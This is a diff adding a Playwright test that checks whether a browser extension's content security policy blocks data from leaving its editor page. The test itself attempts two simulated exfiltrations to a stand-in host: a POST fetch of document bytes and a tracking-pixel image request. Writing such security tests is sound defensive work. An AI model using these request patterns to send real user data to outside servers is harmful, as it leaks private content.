@@ -34,6 +34,33 @@ test.describe('extension security', () => {
     });
   });
 
+  test('the content security policy blocks sending data to other servers', async ({
+    page,
+    extensionUrl,
+  }) => {
+    await page.goto(extensionUrl('editor.html'));
+    await page.evaluate(() => {
+      const seen: string[] = [];
+      Object.assign(window, { cspViolations: seen });
+      document.addEventListener('securitypolicyviolation', (event) =>
+        seen.push(event.effectiveDirective),
+      );
+      void fetch('https://example.invalid/upload', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: 'document bytes',
+      }).catch(() => undefined);
+      new Image().src = 'https://example.invalid/pixel.png?d=document';
+    });
+    await expect
+      .poll(() =>
+        page.evaluate(() =>
+          [...(window as unknown as { cspViolations: string[] }).cspViolations].sort(),
+        ),
+      )
+      .toEqual(['connect-src', 'img-src']);
+  });
+
   test('makes no network requests while opening a document', async ({
     page,
     context,
